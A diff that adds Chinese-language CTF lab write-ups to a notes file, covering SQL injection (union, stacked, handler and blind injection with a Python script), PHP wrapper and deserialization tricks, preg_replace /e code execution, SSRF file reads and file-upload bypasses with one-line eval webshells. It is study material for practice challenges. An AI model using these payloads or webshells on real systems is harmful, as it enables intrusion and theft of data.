@@ -1236,6 +1236,837 @@ username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(right((group_conca
 
 <img src="CTF.assets/image-20230622004827285.png" alt="image-20230622004827285" style="zoom:50%;" />
 
+## [SUCTF 2019]EasySQL
+
+### 前置知识
+
+```sql
+# 在这条SQL语句中，MySQL会将*看为一部分（做一个查询对象），1 || password 做一列（一个查询对象），由于使用的是“||”，所以永远只会查询 || 左边的内容
+mysql> select *,1 || password from user;
++----+----------+----------------------------------+---------------+
+| id | username | password                         | 1 || password |
++----+----------+----------------------------------+---------------+
+|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |             1 |
++----+----------+----------------------------------+---------------+
+1 row in set (0.00 sec)
+```
+
+### 解题流程
+
+**1. 后台SQL语句**
+
+看了WP才知道的后台SQL语句是这样写的
+
+```php
+$sql = "select ".$post['query']."||flag from Flag";
+```
+
+**2. payload**
+
+结合前置知识可以知道最后的payload为：`*,1`
+
+## [GXYCTF2019]BabyUpload
+
+考察的是基本的文件上传绕过，这里只允许上传图片文件。尝试上传`.htaccess`
+
+这里要将文件类型改为：`image/jpeg`，以绕过PHP的过滤
+
+<img src="CTF.assets/image-20230706143243631.png" alt="image-20230706143243631" style="zoom:50%;" />
+
+上传一句话木马，这里使用`script`标签绕过
+
+<img src="CTF.assets/image-20230706143350787.png" alt="image-20230706143350787" style="zoom:50%;" />
+
+使用蚁剑连接，这里必须要将编码器改为Base-64
+
+<img src="CTF.assets/image-20230706143505849.png" alt="image-20230706143505849" style="zoom:50%;" />
+
+## [GYCTF2020]Blacklist
+
+### 前置知识
+
+MySQL的数据查询，除了可以使用`select`方法，还有`handler`方法，此方法可以允许我们一行一行的浏览数据
+
+```sql
+mysql> handler users open;
+Query OK, 0 rows affected (0.01 sec)
+mysql> handler users read first;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.01 sec)
+
+mysql> handler users read next;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  2 | Angelina | I-kill-you |
++----+----------+------------+
+1 row in set (0.00 sec)
+
+mysql> handler users read next;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  3 | Dummy    | p@ssword |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql> handler users close;
+Query OK, 0 rows affected (0.00 sec)
+```
+
+### 解题流程
+
+<img src="CTF.assets/image-20230706152123905.png" alt="image-20230706152123905" style="zoom:50%;" />
+
+这里可以看到了被过滤的函数：
+
+```
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+```
+
+这里没有过滤`updatexml | extractvalue`这两个函数，理论是可以使用报错注入的，但是最后到数据的查询，依然得使用`select`关键字，所以就只能使用`handler`了
+
+另外这里没有过滤`show`关键字，所以是可以使用堆叠注入的
+
+#### 查看闭合方式
+
+明显使用的是单引号闭合方法
+
+<img src="CTF.assets/image-20230706152612645.png" alt="image-20230706152612645" style="zoom:50%;" />
+
+#### 爆表
+
+```
+http://fe8a3b25-b05d-4623-a588-f61d6767ccaa.node4.buuoj.cn:81/?inject=2';show tables --+
+```
+
+<img src="CTF.assets/image-20230706152657052.png" alt="image-20230706152657052" style="zoom:50%;" />
+
+#### `handler`方法查询Flag
+
+```
+http://fe8a3b25-b05d-4623-a588-f61d6767ccaa.node4.buuoj.cn:81/?inject=2';handler FlagHere open;handler FlagHere read first;--+
+```
+
+<img src="CTF.assets/image-20230706152946726.png" alt="image-20230706152946726" style="zoom: 50%;" />
+
+## [CISCN2019 华北赛区 Day2 Web1]Hack World
+
+### 前置知识
+
+#### 布尔盲注
+
+这里先复习以下布尔盲注
+
+先查询目标第一个字母的ASCII值
+
+```sql
+# 使用 limit 过滤出第一个用户名，使用 substr 函数切割出用户名的第一个字母
+mysql> select ascii(substr((select username from users limit 0,1),1,1));
++-----------------------------------------------------------+
+| ascii(substr((select username from users limit 0,1),1,1)) |
++-----------------------------------------------------------+
+|                                                        68 |
++-----------------------------------------------------------+
+1 row in set (0.00 sec)
+```
+
+嵌套select语句做布尔判断
+
+```bash
+mysql> select (select ascii(substr((select username from users limit 0,1),1,1))) > 65;
++-------------------------------------------------------------------------+
+| (select ascii(substr((select username from users limit 0,1),1,1))) > 65 |
++-------------------------------------------------------------------------+
+|                                                                       1 |
++-------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+```
+
+#### 异或运算
+
+==相同得0，不同得1==
+
+```sql
+mysql> select 0^0;
++-----+
+| 0^0 |
++-----+
+|   0 |
++-----+
+1 row in set (0.00 sec)
+
+mysql> select 0^1;
++-----+
+| 0^1 |
++-----+
+|   1 |
++-----+
+1 row in set (0.00 sec)
+```
+
+以此配合上布尔盲注，当查询到的结果为True时，返回`1`，`0^1`依然为1
+
+```sql
+mysql> select 0^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65);
++------------------------------------------------------------------------------------+
+| 0^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65) |
++------------------------------------------------------------------------------------+
+|                                                                                  1 |
++------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select 1^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65);
++------------------------------------------------------------------------------------+
+| 1^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65) |
++------------------------------------------------------------------------------------+
+|                                                                                  0 |
++------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+```
+
+#### 解题流程
+
+首先这里做了基本尝试，发现做了非常严格的过滤，就连空格也被过滤了
+
+所以这里需要使用**异或运算**来做判断
+
+成功回显，但是这里并没有返回任何有用信息，所以可看判断出当有信息返回时，这里就会出`Hello, glzjin wants a girlfriend.`这句话，
+
+<img src="CTF.assets/image-20230706161620420.png" alt="image-20230706161620420" style="zoom:50%;" />
+
+尝试使用布尔盲注，由于这里对空格做了严格过滤，所以还需要使用括号来绕过
+
+```
+0^(select(select(ascii(substring((select(flag)from(flag)),1,1))))>100)
+```
+
+<img src="CTF.assets/image-20230706161746308.png" alt="image-20230706161746308" style="zoom:50%;" />
+
+最后就是写脚本来做盲注了，源码
+
+```py
+import requests
+import urllib3
+import re
+
+urllib3.disable_warnings()
+flag = ""
+for i in range(60):
+    for asc in range(0, 129):
+        payload = f"0^(select(select(ascii(substring((select(flag)from(flag)),{i},1))))={asc})"
+        post_data = {
+            'id': payload
+        }
+
+        req = requests.post("http://bb016411-f720-4158-ab9a-e6884d8f790b.node4.buuoj.cn:81/index.php",
+                            data=post_data, verify=False).text
+        if re.search("Hello, glzjin wants a girlfriend", req):
+            flag += chr(asc)
+            print(flag)
+            break
+```
+
+<img src="CTF.assets/image-20230706173020758.png" alt="image-20230706173020758" style="zoom:50%;" />
+
+## [picoCTF] Scavenger Hunt
+
+### 前置知识
+
+#### `.htaccess`文件
+
+[`.htaccess`文件是Apache HTTP服务器的一个配置文件，它允许用户在不修改主配置文件的情况下对Web服务器的目录进行配置](https://httpd.apache.org/docs/current/howto/htaccess.html)[1](https://httpd.apache.org/docs/current/howto/htaccess.html)。虽然`.htaccess`文件主要用于Apache服务器，但也有其他Web服务器（如NGINX和Microsoft IIS）提供了对类似功能的支持，
+
+#### `.DS_Store`
+
+[`.DS_Store`是一种由macOS系统自动创建的隐藏文件，它存储了文件夹的自定义属性，例如文件夹视图选项、图标位置和其他视觉信息](https://en.wikipedia.org/wiki/.DS_Store)[1](https://en.wikipedia.org/wiki/.DS_Store)。它的名称是Desktop Services Store的缩写，反映了它的用途[1](https://en.wikipedia.org/wiki/.DS_Store)[。这个文件存在于每一个用「访达」打开过的文件夹下面](https://www.zhihu.com/question/20345704)[2](https://www.zhihu.com/question/20345704)
+
+### 解题流程
+
+根据首页的提示，可以看到线索
+
+<img src="CTF.assets/image-20230705011434483.png" alt="image-20230705011434483" style="zoom:50%;" />
+
+直接查看源码可以看到part1
+
+```
+<!-- Here's the first part of the flag: picoCTF{t -->
+```
+
+查看css代码可以看到part2
+
+```
+/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
+```
+
+查看JS代码可以看到下一个提示
+
+```
+/* How can I keep Google from indexing my website? */
+```
+
+根据提示可以快速想到robots协议，访问robots.txt
+
+```
+# Part 3: t_0f_pl4c
+# I think this is an apache server... can you Access the next flag?
+```
+
+Apache网站大概率会存在的敏感文件是`.htaccess`
+
+```
+# Part 4: 3s_2_lO0k
+# I love making websites on my Mac, I can Store a lot of information there.
+```
+
+阅读前置知识2可以知道要访问文件`.DS_Store`
+
+```
+Congrats! You completed the scavenger hunt. Part 5: _f7ce8828}
+```
+
+## [ZJCTF 2019]NiZhuanSiWei
+
+### 前置知识
+
+这题主要考的是PHP反序列化和PHP伪协议
+
+![image-20230707161448462](CTF.assets/image-20230707161448462.png)
+
+### 解题流程
+
+#### 源码
+
+```php
+<?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(welcome to the zjctf($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+#### 绕过点一
+
+首先需要使用`PHP伪协议`来控制输入流，使得`$text`读取到的内容是`welcome to the zjctf`
+
+`file_get_contents()`是触发`PHP伪协议`的函数之一，可以搭配`data://`来输入`welcome to the zjctf`
+
+```
+payload：?text=data://text/plain,welcome to the zjctf
+```
+
+<img src="CTF.assets/image-20230708102817856.png" alt="image-20230708102817856" style="zoom:50%;" />
+
+#### 绕过点二
+
+`$password = unserialize($password);` 存在反序列化的可能性
+
+` include($file);  //useless.php`这里也暗示了要包含`useless.php`
+
+首先使用`php://filter`来读取`useless.php`源码，`include()`函数来触发`PHP伪协议`
+
+```
+payload：?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
+```
+
+![image-20230708103258865](CTF.assets/image-20230708103258865.png)
+
+这里得到了源码，使用的是`base64`来编码，使用PHP做解码
+
+```php
+<?php
+
+$str = "PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=";
+
+echo base64_decode($str);
+
+# 输出
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+```
+
+#### 绕过点三
+
+这里的`PHP反序列`非常简单，只要保证`$file`指向的是`flag文件`就行，源码中的`echo $password;`会自动触发` __tostring()`魔术方法
+
+```php
+<?php
+
+class Flag
+{  //flag.php
+    public $file = 'flag.php';
+
+    public function __tostring()
+    {
+        if (isset($this->file)) {
+            echo file_get_contents($this->file);
+            echo "<br>";
+            return ("U R SO CLOSE !///COME ON PLZ");
+        }
+    }
+}
+
+
+$f = new Flag();
+echo serialize($f);
+
+# 输出
+O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+#### Flag获取
+
+最后将所有得到的结果汇总得到最后的`payload`
+
+注意：此时`$file`需要包含的文件是`useless.php`
+
+```
+payload：?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+![image-20230708103744074](CTF.assets/image-20230708103744074.png)
+
+```
+flag{c087096a-0274-464c-a6c9-93c4d0596c2c}
+```
+
+## [BJDCTF2020]ZJCTF，不过如此
+
+### 前置知识
+
+#### PHP正则表达式`e`模式命令执行漏洞
+
+##### 示例代码
+
+```php
+<?php
+function complexStrtolower($regex, $value){
+    return preg_replace('/('.$regex.')/ei', 'strtolower("\\1")', $value);
+}
+
+# 遍历 $_GET 数组
+foreach ($_GET as $regex => $value){
+    echo complexStrtolower($regex, $value)."\n";
+}
+```
+
+##### `preg_replace()`函数
+
+```bash
+preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
+
+# 翻译成人话就是
+preg_replace (正则表达式 , 替换内容 , 数据源 )
+```
+
+##### 漏洞原理
+
+`PHP`正则`e模式`，会将匹配到的结果替换为指定内容，并将替换后的结果当代码执行
+
+即，触发代码执行漏洞条件：
+
+1. 数据成功被正则表达式匹配
+2. 替换后的内容是正确的PHP代码
+
+##### 爬坑一
+
+上面的命令执行，相当于 **eval('strtolower("\\1");')** 结果，当中的 **\\1** 实际上就是 **\1** ，而 **\1** 在正则表达式中有自己的含义。我们来看看 [**W3Cschool**](https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html) 中对其的描述：
+
+> **反向引用**
+>
+> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。
+
+这里翻译成人话就是：`$value`如果成功被正则表达式匹配到，就会放入**临时缓冲区**中，然后后续使用`\1`将`$value`取出，由于是放一个取一个，所以永远取第一个就行
+
+```
+原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
+变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
+最后得到的结果：strtolower("{${phpinfo()}}");
+```
+
+以此就能达到漏洞执行的目的
+
+##### 爬坑二
+
+`.*`中的`.`是非法字符不能直接传到`$_GET`数组中，否则会被转义为`_*`，从而达到触发漏洞的==第一个条件：数据成功被正则表达式匹配==
+
+所以这里可以使用`\S*`来绕过 **\S\*=${phpinfo()}**
+
+##### 最后触发漏洞
+
+```php
+<?php
+$_GET['\S*'] = "{${phpinfo()}}";
+function complexStrtolower($regex, $value){
+    return preg_replace('/('.$regex.')/ei', 'strtolower("\\1")', $value);
+}
+
+foreach ($_GET as $regex => $value){
+    echo complexStrtolower($regex, $value)."\n";
+}
+# 成功执行phpinfo()
+```
+
+#### PHP复杂表达式
+
+这个是PHP语法之一，以下写法都可成功执行
+
+```php
+<?php
+echo "{${phpinfo()}}";
+echo ${phpinfo()};
+echo strtolower("{${phpinfo()}}");
+```
+
+### 解题流程
+
+#### 源码
+
+```php
+<?php
+
+error_reporting(0);
+$text = $_GET["text"];
+$file = $_GET["file"];
+if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        die("Not now!");
+    }
+
+    include($file);  //next.php
+    
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+#### 绕过点一
+
+首先很明显看到可以使用`file_get_contents()`函数来触发PHP伪协议，使用`data://text/plain,I have a dream`，以让PHP读到所需的值
+
+```
+payload：?text=data://text/plain,I have a dream
+```
+
+<img src="CTF.assets/image-20230708171342360.png" alt="image-20230708171342360" style="zoom:50%;" />
+
+#### 绕过点二
+
+`include($file);  //next.php`暗示了需要包含`next.php`，但是在这之前需要先看一`next.php`的源码
+
+这里也可以使用`include()`函数来触发`php伪协议`来读取
+
+```
+payload：?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
+```
+
+<img src="CTF.assets/image-20230708171639724.png" alt="image-20230708171639724" style="zoom:50%;" />
+
+使用`base64`解码得到源码
+
+```php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+        @eval($_GET['cmd']);
+}
+```
+
+最后使用正则表达式`e`漏洞来执行函数`getFlag`，即可得到答案
+
+到这里就可以根据前面的前置知识得出最后的payload了，但是值得一提的是：代码中使用`foreach`来遍历`$_GET`数组，所以最后可以传入`$_GET['\S*'] = "{${phpinfo()}}"`，至于`$id`可传可不传
+
+```
+payload：?text=data://text/plain,I have a dream&file=next.php&\S*={${getFlag()}}&cmd=system('cat /flag');
+```
+
+```
+flag{d31dcaa7-5505-4bb2-ab93-feb4c5896c73}
+```
+
+## [网鼎杯 2018]Fakebook
+
+这题考点有：php反序列化，SQL注入，CSRF
+
+首先先注册一个账户，博客要求是一个URL
+
+<img src="CTF.assets/image-20230709192226897.png" alt="image-20230709192226897" style="zoom:50%;" />
+
+点击`admin`链接查看源码，可以看到源码这里将百度的`HTML`源码`base64`编码追加到末尾
+
+![image-20230709192315729](CTF.assets/image-20230709192315729.png)
+
+### SQL注入漏洞
+
+且发现一个SQL漏洞注入点：`no`，输入`no=2-1`成功回显`no=1`的内容，判断出是数字型
+
+```
+payload：?no=2-1
+```
+
+<img src="CTF.assets/image-20230709192624010.png" alt="image-20230709192624010" style="zoom:50%;" />
+
+通过`order by`判断出查询的列数是：4
+
+```
+payload：?no=1 order by 4
+```
+
+<img src="CTF.assets/image-20230709192822058.png" alt="image-20230709192822058" style="zoom:50%;" />
+
+使用`union`联合注入可以看到回显位，且这里：`union`后面不能跟`select`，可以使用`/**/`绕过
+
+```
+payload：?no=-1 union/**/select 1,2,3,4
+```
+
+<img src="CTF.assets/image-20230709193017069.png" alt="image-20230709193017069" style="zoom:50%;" />
+
+后面就是常规注入了，这里直接给出数据库内容：
+
+```
+数据库：fakebook
+数据表：users
+字段：no、username、passwd、data
+no：1
+username：admin
+passwd：c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec
+data：O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:20:"http://www.baidu.com";}
+```
+
+#### CSRF漏洞
+
+查看`roots.txt`，可以看到一份`PHP源码`
+
+<img src="CTF.assets/image-20230709193358195.png" alt="image-20230709193358195" style="zoom:50%;" />
+
+```php
+<?php
+
+
+class UserInfo
+{
+    public $name = "";
+    public $age = 0;
+    public $blog = "";
+
+    public function __construct($name, $age, $blog)
+    {
+        $this->name = $name;
+        $this->age = (int)$age;
+        $this->blog = $blog;
+    }
+
+    function get($url)
+    {
+        # PHP 爬虫构造初始化
+        $ch = curl_init();
+
+        # 设置爬取目标
+        curl_setopt($ch, CURLOPT_URL, $url);
+        # CURLOPT_RETURNTRANSFER 表示返回HTTP状态码不返回HTTP内容
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        # 执行爬虫
+        $output = curl_exec($ch);
+        # 获取HTTP状态码
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if ($httpCode == 404) {
+            return 404;
+        }
+        # 关闭资源
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents()
+    {
+        return $this->get($this->blog);
+    }
+
+    public function isValidBlog()
+    {
+        $blog = $this->blog;
+        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+    }
+
+}
+```
+
+### 漏洞分析汇总
+
+==这里由于在做SQL注入，导致后台无法得到应有的数据而报错==
+
+分析网站的报错信息，尝试做反序列化，但是没有获取到数据
+
+<img src="CTF.assets/image-20230709193531538.png" alt="image-20230709193531538" style="zoom:67%;" />
+
+尝试调用函数`getBlogContents()`，这个函数的源码在`user.php`已给出
+
+<img src="CTF.assets/image-20230709193607790.png" alt="image-20230709193607790" style="zoom:67%;" />
+
+这里将信息汇总起来总结一下：
+
++ 后台通过查询`no`值获取数据库的内容，大概的SQL语句是：`select * from users where id = 1`
+
++ 注意观察到`data`字段是一串序列化字符串，那么可以猜测出后台是通过获取`data`的信息，再做反序列化得到用户的信息，也就是这里的内容
+
+  <img src="CTF.assets/image-20230709193944886.png" alt="image-20230709193944886" style="zoom:50%;" />
+
++ 反序列字符串中的`blog`内容是我们填写的网站，并且调用的回调函数是：`getBlogContents()`，这里允许输入一个`URL`，且没做任何的过滤，存在`CSRF`漏洞，另外，PHP的`curl`是可以访问`PHP伪协议`获取到的内容的，但是只能获取到`file://`而不能得到`filter://`的，这里可以看一下试验
+
+  
+
+  试验源码：
+
+  ```php
+  <?php
+  $url = $_GET['url'];
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $url);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  $output = curl_exec($ch);
+  var_dump($output);
+  curl_close($ch);
+  ```
+
+
+
+​     `filter://`读不到，返回`False`
+
+​    <img src="CTF.assets/image-20230709195252474.png" alt="image-20230709195252474" style="zoom:67%;" />
+
+​    `file://`成功读取内容并返回信息
+
+​    <img src="CTF.assets/image-20230709195338015.png" alt="image-20230709195338015" style="zoom:67%;" />
+
+
+
+### `payload`构造
+
+首先尝试将反序列化字符串通过`union`注入提交到`PHP`后台，发现依然可以成功解析，记得给反序列字符串加上单引号
+
+```
+payload：?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:20:"http://www.baidu.com";}'
+```
+
+<img src="CTF.assets/image-20230709195704346.png" alt="image-20230709195704346" style="zoom:50%;" />
+
+对反序列化的内容进行修改，依然可以成功识别
+
+<img src="CTF.assets/image-20230709195730325.png" alt="image-20230709195730325" style="zoom:50%;" />
+
+使用`PHP伪协议`读取FLAG
+
+```
+payload：?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:15;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
+```
+
+<img src="CTF.assets/image-20230709195848702.png" alt="image-20230709195848702" style="zoom:50%;" />
+
+查看源码
+
+<img src="CTF.assets/image-20230709195910078.png" alt="image-20230709195910078" style="zoom:50%;" />
+
+将数据使用`base64`解码
+
+<img src="CTF.assets/image-20230709195957119.png" alt="image-20230709195957119" style="zoom:50%;" />
+
+```
+flag：flag{7e8d8715-6120-4ec3-9f91-e85469922fc7}
+```
+
+## [攻防世界] easyupload
+
+一开始上传了各种文件上去都不行，哪怕将文件的后缀名于`IMIE`类型都改为图片类型都不行，以此猜测到还对文件头进行过滤
+
+需要绕过的点如下
+
+- 检查文件内容是否有php字符串
+- 检查后缀中是否有htaccess或ph
+- 检查文件头部信息
+- 文件MIME类型
+
+先上传`user.ini`文件并修改文件类型，该文件的详细描述在 ---> 橙子科技
+
+由于对文件头做了过滤，所以这里必须附带上`GIF89a`
+
+作用：在加载同一目录下的PHP文件时，会先将`.user.ini`文件的内容加载到PHP配置文件`php.ini`，并执行`php.ini`文件的内容，`auto_prepend_file`加载到文件头将文件`GIF89a.jpg`当作PHP文件来执行
+
+```
+# .user.ini
+GIF89a
+auto_prepend_file=GIF89a.jpg
+```
+
+
+
+<img src="CTF.assets/image-20230709230315351.png" alt="image-20230709230315351" style="zoom:50%;" />
+
+上传木马：注意修改后缀名和文件类型
+
+```
+GIF89a
+<?=eval($_)?>
+```
+
+
+
+<img src="CTF.assets/image-20230709230735067.png" alt="image-20230709230735067" style="zoom:50%;" />
+
+要激活`.user.ini`需要先放同一目录（uploads）的PHP文件
+
+蚁剑连接
+
+<img src="CTF.assets/image-20230709230830785.png" alt="image-20230709230830785" style="zoom:50%;" />
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
@@ -1296,10 +2127,6 @@ Archive:  00000000.zip
 └─$ cat flag.txt 
 flag{ev3n::y0u::bru7us?!} 
 ```
-
-
-
-
 
 
 
